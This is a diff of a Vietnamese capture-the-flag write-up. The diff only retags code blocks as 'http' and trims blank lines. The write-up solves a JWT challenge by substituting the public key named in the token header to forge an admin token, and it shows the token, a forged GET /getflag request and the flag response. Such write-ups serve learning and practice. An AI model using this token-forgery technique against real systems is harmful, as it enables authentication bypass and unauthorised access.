@@ -46,7 +46,7 @@ Mình có check `./getflag` thì
 ![image](https://user-images.githubusercontent.com/93431512/193450478-3f939786-770a-4554-a11e-badb6f104b1b.png)
 
 Check Request kiểm tra Cookie:
-```
+```http
 Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3Q6NTAwMC9zdGF0aWMva2V5cy5wdWIifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwiYXBwcm92ZSI6ZmFsc2V9.KnO6VyVQ12jQ1uSJ8DmbxHDjMWi1-qkwx_EoVGmcpVJaP8E5g_YSl5t30Ij6cQQVFlfjMjJB0OFWm3rJtGcxvzcqgHRBZcPEPnoSPVgtq7GEa9VtsyjRYSMl7oUeiOJrnC0PifPt8KeAZRO43ZNnARULOxGH2Ntmqx6I7is4nPY1rkuz09_FxNMgiZ07gx8CBkKs7F8tNTqsIIWgEXVNFxB9QNlUokoxLjbr85muEz48-rpzqL74sKYA_pvhiwh7IoCRVg5WWrXUTEUIiA-tpX6q-CaImSSUtYL7CEw17O22hEggLwNrXBsJ17ApyaYkbU99ucB9HfMFqwdCBxudUBMagJihGLQe2w3wj_HJiYliIjdAk88l270Yjtm42OoeVW6Pf2XSR-d3ygjvNjjyxv2mBt6_443vx9nPTZ8TjA28mxGvRTs1nRHHmvDDpOLGT5WW6yApvRGoulFEsvrQdmKxPW3udGAy-xfVOjkWe_b7OaY2O4sFLKklR23Dz37H
 ```
 
@@ -66,7 +66,7 @@ Vậy nếu như mình thay Pubkey thì sao nhỉ :)? rất hay trên trang Toke
 
 Vậy ta đã có token mới, let's check :))
 
-```Request
+```http
 GET /getflag HTTP/1.1
 Host: 172.104.49.143:1574
 Upgrade-Insecure-Requests: 1
@@ -78,7 +78,7 @@ Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3
 Connection: close
 ```
 
-```Response
+```http
 HTTP/1.1 200 OK
 Server: Werkzeug/2.2.2 Python/3.10.5
 Date: Sun, 02 Oct 2022 11:12:31 GMT
@@ -88,14 +88,3 @@ Connection: close
 
 FLAG: Flag{JWT_token_is_the_best_token_ever}
 ```
-
-
-
-
-
-
-
-
-
-
-
